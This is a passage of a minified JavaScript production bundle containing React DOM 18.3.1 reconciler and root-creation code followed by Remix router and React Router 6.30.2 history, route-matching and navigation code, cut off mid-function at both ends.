f0;f0=function(t,e,n){if(t!==null)if(t.memoizedProps!==e.pendingProps||un.current)cn=!0;else{if(!(t.lanes&n)&&!(e.flags&128))return cn=!1,I_(t,e,n);cn=!!(t.flags&131072)}else cn=!1,ft&&e.flags&1048576&&yv(e,Tl,e.index);switch(e.lanes=0,e.tag){case 2:var i=e.type;sl(t,e),t=e.pendingProps;var s=Rr(e,Kt.current);Mr(e,n),s=qh(null,e,i,t,s,n);var r=Yh();return e.flags|=1,typeof s=="object"&&s!==null&&typeof s.render=="function"&&s.$$typeof===void 0?(e.tag=1,e.memoizedState=null,e.updateQueue=null,dn(i)?(r=!0,Ml(e)):r=!1,e.memoizedState=s.state!==null&&s.state!==void 0?s.state:null,Hh(e),s.updater=Zl,e.stateNode=s,s._reactInternals=e,nd(e,i,t,n),e=rd(null,e,i,!0,r,n)):(e.tag=0,ft&&r&&Dh(e),Qt(null,e,s,n),e=e.child),e;case 16:i=e.elementType;e:{switch(sl(t,e),t=e.pendingProps,s=i._init,i=s(i._payload),e.type=i,s=e.tag=$_(i),t=Vn(i,t),s){case 0:e=sd(null,e,i,t,n);break e;case 1:e=Pf(null,e,i,t,n);break e;case 11:e=kf(null,e,i,t,n);break e;case 14:e=Lf(null,e,i,Vn(i.type,t),n);break e}throw Error(se(306,i,""))}return e;case 0:return i=e.type,s=e.pendingProps,s=e.elementType===i?s:Vn(i,s),sd(t,e,i,s,n);case 1:return i=e.type,s=e.pendingProps,s=e.elementType===i?s:Vn(i,s),Pf(t,e,i,s,n);case 3:e:{if(Zv(e),t===null)throw Error(se(387));i=e.pendingProps,r=e.memoizedState,s=r.element,Mv(t,e),Rl(e,i,null,n);var a=e.memoizedState;if(i=a.element,r.isDehydrated)if(r={element:i,isDehydrated:!1,cache:a.cache,pendingSuspenseBoundaries:a.pendingSuspenseBoundaries,transitions:a.transitions},e.updateQueue.baseState=r,e.memoizedState=r,e.flags&256){s=Nr(Error(se(423)),e),e=Nf(t,e,i,n,s);break e}else if(i!==s){s=Nr(Error(se(424)),e),e=Nf(t,e,i,n,s);break e}else for(bn=is(e.stateNode.containerInfo.firstChild),Sn=e,ft=!0,Wn=null,n=Sv(e,null,i,n),e.child=n;n;)n.flags=n.flags&-3|4096,n=n.sibling;else{if(kr(),i===s){e=Ni(t,e,n);break e}Qt(t,e,i,n)}e=e.child}return e;case 5:return Ev(e),t===null&&Qu(e),i=e.type,s=e.pendingProps,r=t!==null?t.memoizedProps:null,a=s.children,Yu(i,s)?a=null:r!==null&&Yu(i,r)&&(e.flags|=32),Kv(t,e),Qt(t,e,a,n),e.child;case 6:return t===null&&Qu(e),null;case 13:return Jv(t,e,n);case 4:return Gh(e,e.stateNode.containerInfo),i=e.pendingProps,t===null?e.child=Lr(e,null,i,n):Qt(t,e,i,n),e.child;case 11:return i=e.type,s=e.pendingProps,s=e.elementType===i?s:Vn(i,s),kf(t,e,i,s,n);case 7:return Qt(t,e,e.pendingProps,n),e.child;case 8:return Qt(t,e,e.pendingProps.children,n),e.child;case 12:return Qt(t,e,e.pendingProps.children,n),e.child;case 10:e:{if(i=e.type._context,s=e.pendingProps,r=e.memoizedProps,a=s.value,dt(Al,i._currentValue),i._currentValue=a,r!==null)if(Kn(r.value,a)){if(r.children===s.children&&!un.current){e=Ni(t,e,n);break e}}else for(r=e.child,r!==null&&(r.return=e);r!==null;){var o=r.dependencies;if(o!==null){a=r.child;for(var l=o.firstContext;l!==null;){if(l.context===i){if(r.tag===1){l=Ai(-1,n&-n),l.tag=2;var c=r.updateQueue;if(c!==null){c=c.shared;var h=c.pending;h===null?l.next=l:(l.next=h.next,h.next=l),c.pending=l}}r.lanes|=n,l=r.alternate,l!==null&&(l.lanes|=n),ed(r.return,n,e),o.lanes|=n;break}l=l.next}}else if(r.tag===10)a=r.type===e.type?null:r.child;else if(r.tag===18){if(a=r.return,a===null)throw Error(se(341));a.lanes|=n,o=a.alternate,o!==null&&(o.lanes|=n),ed(a,n,e),a=r.sibling}else a=r.child;if(a!==null)a.return=r;else for(a=r;a!==null;){if(a===e){a=null;break}if(r=a.sibling,r!==null){r.return=a.return,a=r;break}a=a.return}r=a}Qt(t,e,s.children,n),e=e.child}return e;case 9:return s=e.type,i=e.pendingProps.children,Mr(e,n),s=Dn(s),i=i(s),e.flags|=1,Qt(t,e,i,n),e.child;case 14:return i=e.type,s=Vn(i,e.pendingProps),s=Vn(i.type,s),Lf(t,e,i,s,n);case 15:return Yv(t,e,e.type,e.pendingProps,n);case 17:return i=e.type,s=e.pendingProps,s=e.elementType===i?s:Vn(i,s),sl(t,e),e.tag=1,dn(i)?(t=!0,Ml(e)):t=!1,Mr(e,n),jv(e,i,s),nd(e,i,s,n),rd(null,e,i,!0,t,n);case 19:return Qv(t,e,n);case 22:return $v(t,e,n)}throw Error(se(156,e.tag))};function m0(t,e){return Hg(t,e)}function Y_(t,e,n,i){this.tag=t,this.key=n,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.ref=null,this.pendingProps=e,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=i,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function Pn(t,e,n,i){return new Y_(t,e,n,i)}function sp(t){return t=t.prototype,!(!t||!t.isReactComponent)}function $_(t){if(typeof t=="function")return sp(t)?1:0;if(t!=null){if(t=t.$$typeof,t===wh)return 11;if(t===Mh)return 14}return 2}function os(t,e){var n=t.alternate;return n===null?(n=Pn(t.tag,e,t.key,t.mode),n.elementType=t.elementType,n.type=t.type,n.stateNode=t.stateNode,n.alternate=t,t.alternate=n):(n.pendingProps=e,n.type=t.type,n.flags=0,n.subtreeFlags=0,n.deletions=null),n.flags=t.flags&14680064,n.childLanes=t.childLanes,n.lanes=t.lanes,n.child=t.child,n.memoizedProps=t.memoizedProps,n.memoizedState=t.memoizedState,n.updateQueue=t.updateQueue,e=t.dependencies,n.dependencies=e===null?null:{lanes:e.lanes,firstContext:e.firstContext},n.sibling=t.sibling,n.index=t.index,n.ref=t.ref,n}function ol(t,e,n,i,s,r){var a=2;if(i=t,typeof t=="function")sp(t)&&(a=1);else if(typeof t=="string")a=5;else e:switch(t){case lr:return Ds(n.children,s,r,e);case Sh:a=8,s|=8;break;case Tu:return t=Pn(12,n,e,s|2),t.elementType=Tu,t.lanes=r,t;case Au:return t=Pn(13,n,e,s),t.elementType=Au,t.lanes=r,t;case Cu:return t=Pn(19,n,e,s),t.elementType=Cu,t.lanes=r,t;case Eg:return ec(n,s,r,e);default:if(typeof t=="object"&&t!==null)switch(t.$$typeof){case wg:a=10;break e;case Mg:a=9;break e;case wh:a=11;break e;case Mh:a=14;break e;case ji:a=16,i=null;break e}throw Error(se(130,t==null?t:typeof t,""))}return e=Pn(a,n,e,s),e.elementType=t,e.type=i,e.lanes=r,e}function Ds(t,e,n,i){return t=Pn(7,t,i,e),t.lanes=n,t}function ec(t,e,n,i){return t=Pn(22,t,i,e),t.elementType=Eg,t.lanes=n,t.stateNode={isHidden:!1},t}function Oc(t,e,n){return t=Pn(6,t,null,e),t.lanes=n,t}function Fc(t,e,n){return e=Pn(4,t.children!==null?t.children:[],t.key,e),e.lanes=n,e.stateNode={containerInfo:t.containerInfo,pendingChildren:null,implementation:t.implementation},e}function K_(t,e,n,i,s){this.tag=e,this.containerInfo=t,this.finishedWork=this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.pendingContext=this.context=null,this.callbackPriority=0,this.eventTimes=yc(0),this.expirationTimes=yc(-1),this.entangledLanes=this.finishedLanes=this.mutableReadLanes=this.expiredLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=yc(0),this.identifierPrefix=i,this.onRecoverableError=s,this.mutableSourceEagerHydrationData=null}function rp(t,e,n,i,s,r,a,o,l){return t=new K_(t,e,n,o,l),e===1?(e=1,r===!0&&(e|=8)):e=0,r=Pn(3,null,null,e),t.current=r,r.stateNode=t,r.memoizedState={element:i,isDehydrated:n,cache:null,transitions:null,pendingSuspenseBoundaries:null},Hh(r),t}function Z_(t,e,n){var i=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:or,key:i==null?null:""+i,children:t,containerInfo:e,implementation:n}}function g0(t){if(!t)return us;t=t._reactInternals;e:{if(Gs(t)!==t||t.tag!==1)throw Error(se(170));var e=t;do{switch(e.tag){case 3:e=e.stateNode.context;break e;case 1:if(dn(e.type)){e=e.stateNode.__reactInternalMemoizedMergedChildContext;break e}}e=e.return}while(e!==null);throw Error(se(171))}if(t.tag===1){var n=t.type;if(dn(n))return gv(t,n,e)}return e}function v0(t,e,n,i,s,r,a,o,l){return t=rp(n,i,!0,t,s,r,a,o,l),t.context=g0(null),n=t.current,i=en(),s=as(n),r=Ai(i,s),r.callback=e??null,ss(n,r,s),t.current.lanes=s,Za(t,s,i),hn(t,i),t}function tc(t,e,n,i){var s=e.current,r=en(),a=as(s);return n=g0(n),e.context===null?e.context=n:e.pendingContext=n,e=Ai(r,a),e.payload={element:t},i=i===void 0?null:i,i!==null&&(e.callback=i),t=ss(s,e,a),t!==null&&($n(t,s,a,r),tl(t,s,a)),a}function Ol(t){if(t=t.current,!t.child)return null;switch(t.child.tag){case 5:return t.child.stateNode;default:return t.child.stateNode}}function Gf(t,e){if(t=t.memoizedState,t!==null&&t.dehydrated!==null){var n=t.retryLane;t.retryLane=n!==0&&n<e?n:e}}function ap(t,e){Gf(t,e),(t=t.alternate)&&Gf(t,e)}function J_(){return null}var y0=typeof reportError=="function"?reportError:function(t){console.error(t)};function op(t){this._internalRoot=t}nc.prototype.render=op.prototype.render=function(t){var e=this._internalRoot;if(e===null)throw Error(se(409));tc(t,e,null,null)};nc.prototype.unmount=op.prototype.unmount=function(){var t=this._internalRoot;if(t!==null){this._internalRoot=null;var e=t.containerInfo;zs(function(){tc(null,t,null,null)}),e[Li]=null}};function nc(t){this._internalRoot=t}nc.prototype.unstable_scheduleHydration=function(t){if(t){var e=$g();t={blockedOn:null,target:t,priority:e};for(var n=0;n<qi.length&&e!==0&&e<qi[n].priority;n++);qi.splice(n,0,t),n===0&&Zg(t)}};function lp(t){return!(!t||t.nodeType!==1&&t.nodeType!==9&&t.nodeType!==11)}function ic(t){return!(!t||t.nodeType!==1&&t.nodeType!==9&&t.nodeType!==11&&(t.nodeType!==8||t.nodeValue!==" react-mount-point-unstable "))}function Wf(){}function Q_(t,e,n,i,s){if(s){if(typeof i=="function"){var r=i;i=function(){var c=Ol(a);r.call(c)}}var a=v0(e,i,t,0,null,!1,!1,"",Wf);return t._reactRootContainer=a,t[Li]=a.current,Na(t.nodeType===8?t.parentNode:t),zs(),a}for(;s=t.lastChild;)t.removeChild(s);if(typeof i=="function"){var o=i;i=function(){var c=Ol(l);o.call(c)}}var l=rp(t,0,!1,null,null,!1,!1,"",Wf);return t._reactRootContainer=l,t[Li]=l.current,Na(t.nodeType===8?t.parentNode:t),zs(function(){tc(e,l,n,i)}),l}function sc(t,e,n,i,s){var r=n._reactRootContainer;if(r){var a=r;if(typeof s=="function"){var o=s;s=function(){var l=Ol(a);o.call(l)}}tc(e,a,t,s)}else a=Q_(n,e,t,s,i);return Ol(a)}qg=function(t){switch(t.tag){case 3:var e=t.stateNode;if(e.current.memoizedState.isDehydrated){var n=da(e.pendingLanes);n!==0&&(Ah(e,n|1),hn(e,wt()),!(qe&6)&&(Ir=wt()+500,fs()))}break;case 13:zs(function(){var i=Pi(t,1);if(i!==null){var s=en();$n(i,t,1,s)}}),ap(t,1)}};Ch=function(t){if(t.tag===13){var e=Pi(t,134217728);if(e!==null){var n=en();$n(e,t,134217728,n)}ap(t,134217728)}};Yg=function(t){if(t.tag===13){var e=as(t),n=Pi(t,e);if(n!==null){var i=en();$n(n,t,e,i)}ap(t,e)}};$g=function(){return st};Kg=function(t,e){var n=st;try{return st=t,e()}finally{st=n}};Fu=function(t,e,n){switch(e){case"input":if(Lu(t,n),e=n.name,n.type==="radio"&&e!=null){for(n=t;n.parentNode;)n=n.parentNode;for(n=n.querySelectorAll("input[name="+JSON.stringify(""+e)+'][type="radio"]'),e=0;e<n.length;e++){var i=n[e];if(i!==t&&i.form===t.form){var s=Yl(i);if(!s)throw Error(se(90));Ag(i),Lu(i,s)}}}break;case"textarea":Rg(t,n);break;case"select":e=n.value,e!=null&&_r(t,!!n.multiple,e,!1)}};Ug=tp;Og=zs;var eb={usingClientEntryPoint:!1,Events:[Qa,hr,Yl,Ig,Dg,tp]},ea={findFiberByHostInstance:Rs,bundleType:0,version:"18.3.1",rendererPackageName:"react-dom"},tb={bundleType:ea.bundleType,version:ea.version,rendererPackageName:ea.rendererPackageName,rendererConfig:ea.rendererConfig,overrideHookState:null,overrideHookStateDeletePath:null,overrideHookStateRenamePath:null,overrideProps:null,overridePropsDeletePath:null,overridePropsRenamePath:null,setErrorHandler:null,setSuspenseHandler:null,scheduleUpdate:null,currentDispatcherRef:Ui.ReactCurrentDispatcher,findHostInstanceByFiber:function(t){return t=zg(t),t===null?null:t.stateNode},findFiberByHostInstance:ea.findFiberByHostInstance||J_,findHostInstancesForRefresh:null,scheduleRefresh:null,scheduleRoot:null,setRefreshHandler:null,getCurrentFiber:null,reconcilerVersion:"18.3.1-next-f1338f8080-20240426"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var Ao=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!Ao.isDisabled&&Ao.supportsFiber)try{Wl=Ao.inject(tb),ai=Ao}catch{}}Mn.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=eb;Mn.createPortal=function(t,e){var n=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!lp(e))throw Error(se(200));return Z_(t,e,null,n)};Mn.createRoot=function(t,e){if(!lp(t))throw Error(se(299));var n=!1,i="",s=y0;return e!=null&&(e.unstable_strictMode===!0&&(n=!0),e.identifierPrefix!==void 0&&(i=e.identifierPrefix),e.onRecoverableError!==void 0&&(s=e.onRecoverableError)),e=rp(t,1,!1,null,null,n,!1,i,s),t[Li]=e.current,Na(t.nodeType===8?t.parentNode:t),new op(e)};Mn.findDOMNode=function(t){if(t==null)return null;if(t.nodeType===1)return t;var e=t._reactInternals;if(e===void 0)throw typeof t.render=="function"?Error(se(188)):(t=Object.keys(t).join(","),Error(se(268,t)));return t=zg(e),t=t===null?null:t.stateNode,t};Mn.flushSync=function(t){return zs(t)};Mn.hydrate=function(t,e,n){if(!ic(e))throw Error(se(200));return sc(null,t,e,!0,n)};Mn.hydrateRoot=function(t,e,n){if(!lp(t))throw Error(se(405));var i=n!=null&&n.hydratedSources||null,s=!1,r="",a=y0;if(n!=null&&(n.unstable_strictMode===!0&&(s=!0),n.identifierPrefix!==void 0&&(r=n.identifierPrefix),n.onRecoverableError!==void 0&&(a=n.onRecoverableError)),e=v0(e,null,t,1,n??null,s,!1,r,a),t[Li]=e.current,Na(t),i)for(t=0;t<i.length;t++)n=i[t],s=n._getVersion,s=s(n._source),e.mutableSourceEagerHydrationData==null?e.mutableSourceEagerHydrationData=[n,s]:e.mutableSourceEagerHydrationData.push(n,s);return new nc(e)};Mn.render=function(t,e,n){if(!ic(e))throw Error(se(200));return sc(null,t,e,!1,n)};Mn.unmountComponentAtNode=function(t){if(!ic(t))throw Error(se(40));return t._reactRootContainer?(zs(function(){sc(null,null,t,!1,function(){t._reactRootContainer=null,t[Li]=null})}),!0):!1};Mn.unstable_batchedUpdates=tp;Mn.unstable_renderSubtreeIntoContainer=function(t,e,n,i){if(!ic(n))throw Error(se(200));if(t==null||t._reactInternals===void 0)throw Error(se(38));return sc(t,e,n,!1,i)};Mn.version="18.3.1-next-f1338f8080-20240426";function x0(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(x0)}catch(t){console.error(t)}}x0(),xg.exports=Mn;var nb=xg.exports,_0,jf=nb;_0=jf.createRoot,jf.hydrateRoot;/**
 * @remix-run/router v1.23.1
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function Ha(){return Ha=Object.assign?Object.assign.bind():function(t){for(var e=1;e<arguments.length;e++){var n=arguments[e];for(var i in n)Object.prototype.hasOwnProperty.call(n,i)&&(t[i]=n[i])}return t},Ha.apply(this,arguments)}var Ji;(function(t){t.Pop="POP",t.Push="PUSH",t.Replace="REPLACE"})(Ji||(Ji={}));const Xf="popstate";function ib(t){t===void 0&&(t={});function e(i,s){let{pathname:r,search:a,hash:o}=i.location;return vd("",{pathname:r,search:a,hash:o},s.state&&s.state.usr||null,s.state&&s.state.key||"default")}function n(i,s){return typeof s=="string"?s:Fl(s)}return rb(e,n,null,t)}function Ct(t,e){if(t===!1||t===null||typeof t>"u")throw new Error(e)}function cp(t,e){if(!t){typeof console<"u"&&console.warn(e);try{throw new Error(e)}catch{}}}function sb(){return Math.random().toString(36).substr(2,8)}function qf(t,e){return{usr:t.state,key:t.key,idx:e}}function vd(t,e,n,i){return n===void 0&&(n=null),Ha({pathname:typeof t=="string"?t:t.pathname,search:"",hash:""},typeof e=="string"?Gr(e):e,{state:n,key:e&&e.key||i||sb()})}function Fl(t){let{pathname:e="/",search:n="",hash:i=""}=t;return n&&n!=="?"&&(e+=n.charAt(0)==="?"?n:"?"+n),i&&i!=="#"&&(e+=i.charAt(0)==="#"?i:"#"+i),e}function Gr(t){let e={};if(t){let n=t.indexOf("#");n>=0&&(e.hash=t.substr(n),t=t.substr(0,n));let i=t.indexOf("?");i>=0&&(e.search=t.substr(i),t=t.substr(0,i)),t&&(e.pathname=t)}return e}function rb(t,e,n,i){i===void 0&&(i={});let{window:s=document.defaultView,v5Compat:r=!1}=i,a=s.history,o=Ji.Pop,l=null,c=h();c==null&&(c=0,a.replaceState(Ha({},a.state,{idx:c}),""));function h(){return(a.state||{idx:null}).idx}function d(){o=Ji.Pop;let g=h(),u=g==null?null:g-c;c=g,l&&l({action:o,location:_.location,delta:u})}function p(g,u){o=Ji.Push;let v=vd(_.location,g,u);c=h()+1;let x=qf(v,c),S=_.createHref(v);try{a.pushState(x,"",S)}catch(E){if(E instanceof DOMException&&E.name==="DataCloneError")throw E;s.location.assign(S)}r&&l&&l({action:o,location:_.location,delta:1})}function f(g,u){o=Ji.Replace;let v=vd(_.location,g,u);c=h();let x=qf(v,c),S=_.createHref(v);a.replaceState(x,"",S),r&&l&&l({action:o,location:_.location,delta:0})}function y(g){let u=s.location.origin!=="null"?s.location.origin:s.location.href,v=typeof g=="string"?g:Fl(g);return v=v.replace(/ $/,"%20"),Ct(u,"No window.location.(origin|href) available to create URL for href: "+v),new URL(v,u)}let _={get action(){return o},get location(){return t(s,a)},listen(g){if(l)throw new Error("A history only accepts one active listener");return s.addEventListener(Xf,d),l=g,()=>{s.removeEventListener(Xf,d),l=null}},createHref(g){return e(s,g)},createURL:y,encodeLocation(g){let u=y(g);return{pathname:u.pathname,search:u.search,hash:u.hash}},push:p,replace:f,go(g){return a.go(g)}};return _}var Yf;(function(t){t.data="data",t.deferred="deferred",t.redirect="redirect",t.error="error"})(Yf||(Yf={}));function ab(t,e,n){return n===void 0&&(n="/"),ob(t,e,n)}function ob(t,e,n,i){let s=typeof e=="string"?Gr(e):e,r=up(s.pathname||"/",n);if(r==null)return null;let a=b0(t);lb(a);let o=null;for(let l=0;o==null&&l<a.length;++l){let c=_b(r);o=vb(a[l],c)}return o}function b0(t,e,n,i){e===void 0&&(e=[]),n===void 0&&(n=[]),i===void 0&&(i="");let s=(r,a,o)=>{let l={relativePath:o===void 0?r.path||"":o,caseSensitive:r.caseSensitive===!0,childrenIndex:a,route:r};l.relativePath.startsWith("/")&&(Ct(l.relativePath.startsWith(i),'Absolute route path "'+l.relativePath+'" nested under path '+('"'+i+'" is not valid. An absolute child route path ')+"must start with the combined path of all its parent routes."),l.relativePath=l.relativePath.slice(i.length));let c=ls([i,l.relativePath]),h=n.concat(l);r.children&&r.children.length>0&&(Ct(r.index!==!0,"Index routes must not have child routes. Please remove "+('all child routes from route path "'+c+'".')),b0(r.children,e,h,c)),!(r.path==null&&!r.index)&&e.push({path:c,score:mb(c,r.index),routesMeta:h})};return t.forEach((r,a)=>{var o;if(r.path===""||!((o=r.path)!=null&&o.includes("?")))s(r,a);else for(let l of S0(r.path))s(r,a,l)}),e}function S0(t){let e=t.split("/");if(e.length===0)return[];let[n,...i]=e,s=n.endsWith("?"),r=n.replace(/\?$/,"");if(i.length===0)return s?[r,""]:[r];let a=S0(i.join("/")),o=[];return o.push(...a.map(l=>l===""?r:[r,l].join("/"))),s&&o.push(...a),o.map(l=>t.startsWith("/")&&l===""?"/":l)}function lb(t){t.sort((e,n)=>e.score!==n.score?n.score-e.score:gb(e.routesMeta.map(i=>i.childrenIndex),n.routesMeta.map(i=>i.childrenIndex)))}const cb=/^:[\w-]+$/,ub=3,db=2,hb=1,pb=10,fb=-2,$f=t=>t==="*";function mb(t,e){let n=t.split("/"),i=n.length;return n.some($f)&&(i+=fb),e&&(i+=db),n.filter(s=>!$f(s)).reduce((s,r)=>s+(cb.test(r)?ub:r===""?hb:pb),i)}function gb(t,e){return t.length===e.length&&t.slice(0,-1).every((i,s)=>i===e[s])?t[t.length-1]-e[e.length-1]:0}function vb(t,e,n){let{routesMeta:i}=t,s={},r="/",a=[];for(let o=0;o<i.length;++o){let l=i[o],c=o===i.length-1,h=r==="/"?e:e.slice(r.length)||"/",d=yb({path:l.relativePath,caseSensitive:l.caseSensitive,end:c},h),p=l.route;if(!d)return null;Object.assign(s,d.params),a.push({params:s,pathname:ls([r,d.pathname]),pathnameBase:Eb(ls([r,d.pathnameBase])),route:p}),d.pathnameBase!=="/"&&(r=ls([r,d.pathnameBase]))}return a}function yb(t,e){typeof t=="string"&&(t={path:t,caseSensitive:!1,end:!0});let[n,i]=xb(t.path,t.caseSensitive,t.end),s=e.match(n);if(!s)return null;let r=s[0],a=r.replace(/(.)\/+$/,"$1"),o=s.slice(1);return{params:i.reduce((c,h,d)=>{let{paramName:p,isOptional:f}=h;if(p==="*"){let _=o[d]||"";a=r.slice(0,r.length-_.length).replace(/(.)\/+$/,"$1")}const y=o[d];return f&&!y?c[p]=void 0:c[p]=(y||"").replace(/%2F/g,"/"),c},{}),pathname:r,pathnameBase:a,pattern:t}}function xb(t,e,n){e===void 0&&(e=!1),n===void 0&&(n=!0),cp(t==="*"||!t.endsWith("*")||t.endsWith("/*"),'Route path "'+t+'" will be treated as if it were '+('"'+t.replace(/\*$/,"/*")+'" because the `*` character must ')+"always follow a `/` in the pattern. To get rid of this warning, "+('please change the route path to "'+t.replace(/\*$/,"/*")+'".'));let i=[],s="^"+t.replace(/\/*\*?$/,"").replace(/^\/*/,"/").replace(/[\\.*+^${}|()[\]]/g,"\\$&").replace(/\/:([\w-]+)(\?)?/g,(a,o,l)=>(i.push({paramName:o,isOptional:l!=null}),l?"/?([^\\/]+)?":"/([^\\/]+)"));return t.endsWith("*")?(i.push({paramName:"*"}),s+=t==="*"||t==="/*"?"(.*)$":"(?:\\/(.+)|\\/*)$"):n?s+="\\/*$":t!==""&&t!=="/"&&(s+="(?:(?=\\/|$))"),[new RegExp(s,e?void 0:"i"),i]}function _b(t){try{return t.split("/").map(e=>decodeURIComponent(e).replace(/\//g,"%2F")).join("/")}catch(e){return cp(!1,'The URL path "'+t+'" could not be decoded because it is is a malformed URL segment. This is probably due to a bad percent '+("encoding ("+e+").")),t}}function up(t,e){if(e==="/")return t;if(!t.toLowerCase().startsWith(e.toLowerCase()))return null;let n=e.endsWith("/")?e.length-1:e.length,i=t.charAt(n);return i&&i!=="/"?null:t.slice(n)||"/"}const bb=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,Sb=t=>bb.test(t);function wb(t,e){e===void 0&&(e="/");let{pathname:n,search:i="",hash:s=""}=typeof t=="string"?Gr(t):t,r;if(n)if(Sb(n))r=n;else{if(n.includes("//")){let a=n;n=n.replace(/\/\/+/g,"/"),cp(!1,"Pathnames cannot have embedded double slashes - normalizing "+(a+" -> "+n))}n.startsWith("/")?r=Kf(n.substring(1),"/"):r=Kf(n,e)}else r=e;return{pathname:r,search:Tb(i),hash:Ab(s)}}function Kf(t,e){let n=e.replace(/\/+$/,"").split("/");return t.split("/").forEach(s=>{s===".."?n.length>1&&n.pop():s!=="."&&n.push(s)}),n.length>1?n.join("/"):"/"}function Bc(t,e,n,i){return"Cannot include a '"+t+"' character in a manually specified "+("`to."+e+"` field ["+JSON.stringify(i)+"].  Please separate it out to the ")+("`to."+n+"` field. Alternatively you may provide the full path as ")+'a string in <Link to="..."> and the router will parse it for you.'}function Mb(t){return t.filter((e,n)=>n===0||e.route.path&&e.route.path.length>0)}function w0(t,e){let n=Mb(t);return e?n.map((i,s)=>s===n.length-1?i.pathname:i.pathnameBase):n.map(i=>i.pathnameBase)}function M0(t,e,n,i){i===void 0&&(i=!1);let s;typeof t=="string"?s=Gr(t):(s=Ha({},t),Ct(!s.pathname||!s.pathname.includes("?"),Bc("?","pathname","search",s)),Ct(!s.pathname||!s.pathname.includes("#"),Bc("#","pathname","hash",s)),Ct(!s.search||!s.search.includes("#"),Bc("#","search","hash",s)));let r=t===""||s.pathname==="",a=r?"/":s.pathname,o;if(a==null)o=n;else{let d=e.length-1;if(!i&&a.startsWith("..")){let p=a.split("/");for(;p[0]==="..";)p.shift(),d-=1;s.pathname=p.join("/")}o=d>=0?e[d]:"/"}let l=wb(s,o),c=a&&a!=="/"&&a.endsWith("/"),h=(r||a===".")&&n.endsWith("/");return!l.pathname.endsWith("/")&&(c||h)&&(l.pathname+="/"),l}const ls=t=>t.join("/").replace(/\/\/+/g,"/"),Eb=t=>t.replace(/\/+$/,"").replace(/^\/*/,"/"),Tb=t=>!t||t==="?"?"":t.startsWith("?")?t:"?"+t,Ab=t=>!t||t==="#"?"":t.startsWith("#")?t:"#"+t;function Cb(t){return t!=null&&typeof t.status=="number"&&typeof t.statusText=="string"&&typeof t.internal=="boolean"&&"data"in t}const E0=["post","put","patch","delete"];new Set(E0);const Rb=["get",...E0];new Set(Rb);/**
 * React Router v6.30.2
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function Ga(){return Ga=Object.assign?Object.assign.bind():function(t){for(var e=1;e<arguments.length;e++){var n=arguments[e];for(var i in n)Object.prototype.hasOwnProperty.call(n,i)&&(t[i]=n[i])}return t},Ga.apply(this,arguments)}const dp=$.createContext(null),kb=$.createContext(null),Ws=$.createContext(null),rc=$.createContext(null),ms=$.createContext({outlet:null,matches:[],isDataRoute:!1}),T0=$.createContext(null);function Lb(t,e){let{relative:n}=e===void 0?{}:e;to()||Ct(!1);let{basename:i,navigator:s}=$.useContext(Ws),{hash:r,pathname:a,search:o}=R0(t,{relative:n}),l=a;return i!=="/"&&(l=a==="/"?i:ls([i,a])),s.createHref({pathname:l,search:o,hash:r})}function to(){return $.useContext(rc)!=null}function no(){return to()||Ct(!1),$.useContext(rc).location}function A0(t){$.useContext(Ws).static||$.useLayoutEffect(t)}function C0(){let{isDataRoute:t}=$.useContext(ms);return t?jb():Pb()}function Pb(){to()||Ct(!1);let t=$.useContext(dp),{basename:e,future:n,navigator:i}=$.useContext(Ws),{matches:s}=$.useContext(ms),{pathname:r}=no(),a=JSON.stringify(w0(s,n.v7_relativeSplatPath)),o=$.useRef(!1);return A0(()=>{o.current=!0}),$.useCallback(function(c,h){if(h===void 0&&(h={}),!o.current)return;if(typeof c=="number"){i.go(c);return}let d=M0(c,JSON.parse(a),r,h.relative==="path");t==null&&e!=="/"&&(d.pathname=d.pathname==="/"?e:ls([e,d.pathname])),(h.replace?i.replace:i.push)(d,h.state,h)},[e,i,a,r,t])}function Nb(){let{matches:t}=$.useContext(ms),e=t[t.length-1];return e?e.params:{}}function R0(t,e){let{relative:n}=e===void 0?{}:e,{future:i}=$.useContext(Ws),{matches:s}=$.useContext(ms),{pathname:r}=no(),a=JSON.stringify(w0(s,i.v7_relativeSplatPath));return $.useMemo(()=>M0(t,JSON.parse(a),r,n==="path"),[t,a,r,n])}function Ib(t,e){return Db(t,e)}function Db(t,e,n,i){to()||Ct(!1);let{navigator:s}=$.useContext(Ws),{matches:r}=$.useContext(ms),a=r[r.length-1],o=a?a.params:{};a&&a.pathname;let l=a?a.pathnameBase:"/";a&&a.route;let c=no(),h;if(e){var d;let g=typeof e=="string"?Gr(e):e;l==="/"||(d=g.pathname)!=null&&d.startsWith(l)||Ct(!1),h=g}else h=c;let p=h.pathname||"/",f=p;if(l!=="/"){let g=l.replace(/^\//,"").split("/");f="/"+p.replace(/^\//,"").split("/").slice(g.length).join("/")}let y=ab(t,{pathname:f}),_=zb(y&&y.map(g=>Object.assign({},g,{params:Object.assign({},o,g.params),pathname:ls([l,s.encodeLocation?s.encodeLocation(g.pathname).pathname:g.pathname]),pathnameBase:g.pathnameBase==="/"?l:ls([l,s.encodeLocation?s.encodeLocation(g.pathnameBase).pathname:g.pathnameBase])})),r,n,i);return e&&_?$.createElement(rc.Provider,{value:{location:Ga({pathname:"/",search:"",hash:"",state:null,key:"default"},h),navigationType:Ji.Pop}},_):_}function Ub(){let t=Wb(),e=Cb(t)?t.status+" "+t.statusText:t instanceof Error?t.message:JSON.stringify(t),n=t instanceof Error?t.stack:null,s={padding:"0.5rem",backgroundColor:"rgba(200,200,200, 0.5)"};return 